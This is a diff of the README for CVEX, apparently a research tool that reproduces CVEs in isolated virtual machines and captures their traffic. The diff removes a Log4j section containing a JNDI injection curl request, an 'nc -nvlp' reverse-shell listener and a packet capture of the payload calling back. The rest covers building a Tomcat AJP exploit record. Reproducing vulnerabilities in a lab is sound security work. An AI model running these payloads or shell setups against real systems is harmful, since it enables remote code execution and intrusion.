@@ -72,144 +72,12 @@ CVEX comes with a set of PoCs:
 - [CVE-0000-00001](records/CVE-0000-00001): curl, executed on Ubuntu, downloads a web-page from ngix, running on another Ubuntu
 - [CVE-0000-00002](records/CVE-0000-00002): curl, executed on Ubuntu, downloads a web-page from ngix, running on Windows
 - [CVE-0000-00003](records/CVE-0000-00003): curl, executed on Windows, downloads a web-page from ngix, running on another Windows
-- [CVE-2021-44228](records/CVE-2021-44228): Log4j vulnerability with backconnect to remote shell
-
-<details>
-<summary>CVE-2021-44228 logs analysis</summary>
-
-[records/CVE-2021-44228/cvex.yml](records/CVE-2021-44228/cvex.yml) describes the VM infrastructure for this CVE:
-
-```
-blueprint: ubuntu2204-ubuntu2204
-ubuntu1:
-  playbook: ubuntu1.yml
-ubuntu2:
-  playbook: ubuntu2.yml
-  trace: "curl|python3|nc|java"
-  command:
-    - "python3 /opt/log4j-shell-poc/poc.py --userip %ubuntu2% --webport 9999 --lport 1234&~~~Listening on 0.0.0.0:1389"
-    - "nc -nvlp 1234&~~~Listening on 0.0.0.0 1234"
-    # Web server may not reply, which will cause curl to hang
-    - "curl -d 'uname=%24%7Bjndi%3Aldap%3A%2F%2F%ubuntu2%%3A1389%2Fa%7D&password=' http://ubuntu1:8080/login&"
-    - "sleep 10"
-```
-
-Ansible playbook `ubuntu1.yml` installs an Apache Tomcat based web application, vulnerable to the Log4j attack. Ansible playbook `ubuntu2.yml` installs a fake LDAP server and a web server that is hosting the payload.
-
-Since the execution process has been already described in the section `Execution of CVE-0000-00000`, let's focus on analysis of logs produced by CVEX. In our logs the IP address of `ubuntu1` is `192.168.56.3`, the IP address of `ubuntu2` is `192.168.56.4`.
-
-To inspect the PCAP file, run tcpdump:
-```
-~/CVEX$ tcpdump -qns 0 -A -r out/router_raw.pcap
-```
-
-The attacker `192.168.56.4` (`ubuntu2`) issues an HTTP POST request to Apache Tomcat running on `192.168.56.3` (`ubuntu1`). The POST request contains malicious data `${jndi:ldap://192.168.56.4:1389/a}` in the `uname` field. The data is URL-encoded:
-```
-15:34:03.050477 IP 192.168.56.4.36880 > 192.168.56.3.8080: tcp 219
-E....t@.@.....8...8.....:.u................
-.....$C.POST /login HTTP/1.1
-Host: ubuntu1:8080
-User-Agent: curl/7.81.0
-Accept: */*
-Content-Length: 68
-Content-Type: application/x-www-form-urlencoded
-
-uname=%24%7Bjndi%3Aldap%3A%2F%2F192.168.56.4%3A1389%2Fa%7D&password=
-```
-
-Log4j logs the `${jndi:ldap://192.168.56.4:1389/a}` string. This triggers the JNDI manager to make a request to the LDAP server controlled by the attacker (`192.168.56.4:1389`). The LDAP server replies with a link to the payload:
-```
-15:34:04.187067 IP 192.168.56.4.1389 > 192.168.56.3.36182: tcp 148
-E.....@.@.d...8...8..m.V.:..Z3.I...........
-.....$G.0.....d....a0..0...javaClassName1...foo0+..javaCodeBase1...http://192.168.56.4:9999/0$..objectClass1...javaNamingReference0...javaFactory1	..Exploit
-15:34:04.187088 IP 192.168.56.4.1389 > 192.168.56.3.36182: tcp 148
-E.....@.?.e...8...8..m.V.:..Z3.I...........
-.....$G.0.....d....a0..0...javaClassName1...foo0+..javaCodeBase1...http://192.168.56.4:9999/0$..objectClass1...javaNamingReference0...javaFactory1	..Exploit
-15:34:04.191353 IP 192.168.56.4.1389 > 192.168.56.3.36182: tcp 14
-E..B..@.@.em..8...8..m.V.:..Z3.I...........
-.....$G.0....e.
-......
-```
-
-JNDI manager requests the payload hosted on `http://192.168.56.4:9999/Exploit.class`:
-```
-15:34:04.229544 IP 192.168.56.3.41350 > 192.168.56.4.9999: tcp 213
-E..	@.@.>.	...8...8...'...._96.............
-.$Ha...8GET /Exploit.class HTTP/1.1
-Cache-Control: no-cache
-Pragma: no-cache
-User-Agent: Java/1.8.0_102
-Host: 192.168.56.4:9999
-Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
-Connection: keep-alive
-```
-
-Web server `192.168.56.4:9999` replies with the payload:
-```
-15:34:04.385348 IP 192.168.56.4.9999 > 192.168.56.3.41350: tcp 198
-E.....@.?..#..8...8.'...96.....4...........
-.....$HaHTTP/1.0 200 OK
-Server: SimpleHTTP/0.6 Python/3.10.12
-Date: Wed, 09 Oct 2024 13:33:51 GMT
-Content-type: application/java-vm
-Content-Length: 1361
-Last-Modified: Wed, 09 Oct 2024 13:33:48 GMT
-
-15:34:04.408072 IP 192.168.56.4.9999 > 192.168.56.3.41350: tcp 1361
-E.....@.@.|...8...8.'...96.c...4...........
-.....$I........4.f
-...-...../..0..1
-...2
-...3
-...4..5
-.	.6
-.7.8
-.7.9
-.	.8
-.7.:
-.	.:
-.	.;
-.<.=
-.<.>
-.?.@
-.?.A........2
-.B.C
-.7.D..E
-.7.F
-.	.G..H..I...<init>...()V...Code...LineNumberTable...StackMapTable..H..1..J..5..K..L..E..
-Exceptions..
-SourceFile...Exploit.java........192.168.56.4.../bin/sh...java/lang/ProcessBuilder...java/lang/String....M..N.O..P.Q...java/net/Socket....R..J..S.T..U.T..V.W..X.Y..K..Z.[..\.[..L..].^.._....`..a.b..c.[...java/lang/Exception..d....e.....Exploit...java/lang/Object...java/lang/Process...java/io/InputStream...java/io/OutputStream...([Ljava/lang/String;)V...redirectErrorStream...(Z)Ljava/lang/ProcessBuilder;...start...()Ljava/lang/Process;...(Ljava/lang/String;I)V...getInputStream...()Ljava/io/InputStream;...getErrorStream...getOutputStream...()Ljava/io/OutputStream;...isClosed...()Z..	available...()I...read...write...(I)V...flush...java/lang/Thread...sleep...(J)V..	exitValue...destroy...close.!................... ............*.....L...=..N...Y....Y.-S..........:...	Y+...
-:......:......:......:......:	.....:
-.......`.........
-....................
-....................	............
-....	..............W...:............................!...n.....	...
-.............&...1...8...?...F...T...\...d...q...y.................................!..."...$...%...&."...1....T....#..$...$..%..&..'..'..'..(..(......X..)..*...........+.....,
-```
-
-The payload connects back to netcat (`nc -nvlp 1234` from cvex.yml), executed by the attacker:
-```
-15:34:04.462260 IP 192.168.56.3.60972 > 192.168.56.4.1234: tcp 0
-E..<I.@.?..Y..8...8..,...g........../A.........
-.$IN........
-15:34:04.462345 IP 192.168.56.3.60972 > 192.168.56.4.1234: tcp 0
-E..<I.@.>..Y..8...8..,...g........../A.........
-.$IN........
-15:34:04.464332 IP 192.168.56.4.1234 > 192.168.56.3.60972: tcp 0
-E..<..@.@.Id..8...8....,.Z...g......"..........
-...3.$IN....
-15:34:04.464348 IP 192.168.56.4.1234 > 192.168.56.3.60972: tcp 0
-E..<..@.?.Jd..8...8....,.Z...g......"..........
-...3.$IN....
-```
-
-</details>
 
 ## Debug
 
 1. Re-start CVEX.
 2. Restart CVEX with the `-v` parameter (verbose logging).
-3. Connect to the VM via SSH with the help of `vagrant ssh` command
+3. Connect to the VM via SSH with the help of `vagrant ssh` command.
 <details>
 <summary>How to use "vagrant ssh"</summary>
 
@@ -262,16 +130,19 @@ Use VirtualBox GUI to manage VMs and snapshots.
 
 <summary>Expand to see how to create your own CVEX record</summary>
 
-Choose the right name for your CVEX record and create a new subfolder with this name in the [records](records) folder. Let's imagine that our goal is to reproduce CVE-2020-1938 (Apache Tomcat AJP Arbitrary File Read/Include Vulnerability). Obvious choice for the folder name would be `CVE-2020-1938`.
 
-Let's use the [ubuntu2204-ubuntu2204](blueprints/ubuntu2204-ubuntu2204) blueprint. Create the simplest `records/CVE-2020-1938/cvex.yml`:
+Clone https://github.com/ucsb-seclab/CVEX-records.
+
+Choose the right name for your CVEX record and create a new subfolder with this name inside `CVEX-records`. Let's imagine that our goal is to reproduce CVE-2020-1938 (Apache Tomcat AJP Arbitrary File Read/Include Vulnerability). Obvious choice for the folder name would be `CVE-2020-1938`.
+
+Let's use the [ubuntu2204-ubuntu2204](blueprints/ubuntu2204-ubuntu2204) blueprint. Create the simplest `CVEX-records/CVE-2020-1938/cvex.yml`:
 ```
 blueprint: ubuntu2204-ubuntu2204
 ```
 
 Run CVEX:
 ```
-~/CVEX$ cvex records/CVE-2020-1938
+~/CVEX-records$ cvex CVE-2020-1938
 ```
 
 CVEX will create the router VM and two Ubuntu 22.04 VMs:
@@ -497,9 +368,9 @@ vagrant@ubuntu1:~$
 
 The first step would be to install the vulnerable Apache Tomcat 9.0.30 on `ubuntu1`. You need to find the binaries and build the Ansible playbook `ubuntu1.yml` that installs this service. Create the following structure of the CVEX record folder:
 ```
-$/CVEX$ tree records/CVE-2020-1938
+~/CVEX-records$ tree CVE-2020-1938
 
-records/CVE-2020-1938
+CVE-2020-1938
 ├── cvex.yml
 ├── data
 │   └── apache-tomcat-9.0.30.tar.gz
@@ -508,7 +379,7 @@ records/CVE-2020-1938
 
 Now run the Ansible playbook on `ubuntu1` to see if it works:
 ```
-$ ansible-playbook -i ~/.cvex/bento_ubuntu-22.04/202404.23.0/1/inventory.ini records/CVE-2020-1938/ubuntu1.yml 
+~/CVEX-records$ ansible-playbook -i ~/.cvex/bento_ubuntu-22.04/202404.23.0/1/inventory.ini CVE-2020-1938/ubuntu1.yml 
 
 PLAY [Install Apache Tomcat vulnerable to AJP Arbitrary File Read/Include（CVE-2020-1938）] ***************************************************************************************************************
 
@@ -571,9 +442,9 @@ ubuntu1:
 
 Next step is to run the exploit on `ubuntu2`. Let's use this exploit: https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/. In the same manner, the Ansible playbook `ubuntu2.yml` was created to install the `CNVD-2020-10487-Tomcat-Ajp-lfi.py` exploit, and the file itself was put to the `data` folder. The updated tree of the CVEX record folder should look like this:
 ```
-$ tree records/CVE-2020-1938
+~/CVEX-records$ tree CVE-2020-1938
 
-records/CVE-2020-1938
+CVE-2020-1938
 ├── cvex.yml
 ├── data
 │   ├── apache-tomcat-9.0.30.tar.gz
@@ -584,7 +455,7 @@ records/CVE-2020-1938
 
 Now run the Ansible playbook on `ubuntu2` to see if it works:
 ```
-$ ansible-playbook -i ~/.cvex/bento_ubuntu-22.04/202404.23.0/2/inventory.ini records/CVE-2020-1938/ubuntu2.yml 
+~/CVEX-records$ ansible-playbook -i ~/.cvex/bento_ubuntu-22.04/202404.23.0/2/inventory.ini CVE-2020-1938/ubuntu2.yml 
 
 PLAY [Install the exploit for Apache Tomcat AJP Arbitrary File Read/Include Vulnerability（CVE-2020-1938）] ***********************************************************************************************
 
@@ -671,7 +542,7 @@ Before testing if the whole thing works, **delete** the `CVE-2020-1938/ubuntu1` 
 
 Fire it all up:
 ```
-~/CVEX$ cvex records/CVE-2020-1938
+~/CVEX-records$ cvex CVE-2020-1938
 
 2024-10-23 15:46:56,016 - INFO - [router] Retrieving status of router...
 2024-10-23 15:46:59,771 - INFO - [router] Retrieving snapshot list of router...
@@ -703,7 +574,7 @@ Fire it all up:
 2024-10-23 15:48:26,001 - INFO - [ubuntu1] PLAY RECAP *********************************************************************
 2024-10-23 15:48:26,001 - INFO - [ubuntu1] ubuntu1                    : ok=3    changed=2    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0
 2024-10-23 15:48:26,001 - INFO - [ubuntu1] 
-2024-10-23 15:48:26,167 - INFO - [ubuntu1] Executing Ansible playbook records/CVE-2020-1938/ubuntu1.yml...
+2024-10-23 15:48:26,167 - INFO - [ubuntu1] Executing Ansible playbook CVE-2020-1938/ubuntu1.yml...
 2024-10-23 15:48:27,031 - INFO - [ubuntu1] 
 2024-10-23 15:48:27,031 - INFO - [ubuntu1] PLAY [Install Apache Tomcat vulnerable to AJP Arbitrary File Read/Include（CVE-2020-1938）] ***
 2024-10-23 15:48:27,031 - INFO - [ubuntu1] 
@@ -786,7 +657,7 @@ Fire it all up:
 2024-10-23 15:50:59,812 - INFO - [ubuntu2] PLAY RECAP *********************************************************************
 2024-10-23 15:50:59,812 - INFO - [ubuntu2] ubuntu2                    : ok=3    changed=2    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0
 2024-10-23 15:50:59,812 - INFO - [ubuntu2] 
-2024-10-23 15:50:59,941 - INFO - [ubuntu2] Executing Ansible playbook records/CVE-2020-1938/ubuntu2.yml...
+2024-10-23 15:50:59,941 - INFO - [ubuntu2] Executing Ansible playbook CVE-2020-1938/ubuntu2.yml...
 2024-10-23 15:51:00,716 - INFO - [ubuntu2] 
 2024-10-23 15:51:00,716 - INFO - [ubuntu2] PLAY [Install the exploit for Apache Tomcat AJP Arbitrary File Read/Include Vulnerability（CVE-2020-1938）] ***
 2024-10-23 15:51:00,716 - INFO - [ubuntu2] 
@@ -869,7 +740,7 @@ Fire it all up:
 
 Let's see if CVEX was able to catch network interaction of the exploit with the Tomcat:
 ```
-~/CVEX$ tcpdump -qns 0 -A -r out/router_raw.pcap
+~/CVEX-records$ tcpdump -qns 0 -A -r out/router_raw.pcap
 ```
 
 Indeed, we see the attacker `192.168.56.4` (`ubuntu2`) connecting to `192.168.56.3:8009` (`ubuntu1`):
@@ -991,9 +862,9 @@ Contributors can provide additional blueprints.
 
 ## Contributions
 
-To contribute a new CVEX record, create a pull request for a new subfolder inside [records](records) with the following infrastructure:
+To contribute a new CVEX record, create a pull request for a new subfolder inside https://github.com/ucsb-seclab/CVEX-records with the following infrastructure:
 ```
-records/CVE-XXXX-YYYYY
+CVE-XXXX-YYYYY
 ├── cvex.yml
 ├── data
 │   ├── file1.ext
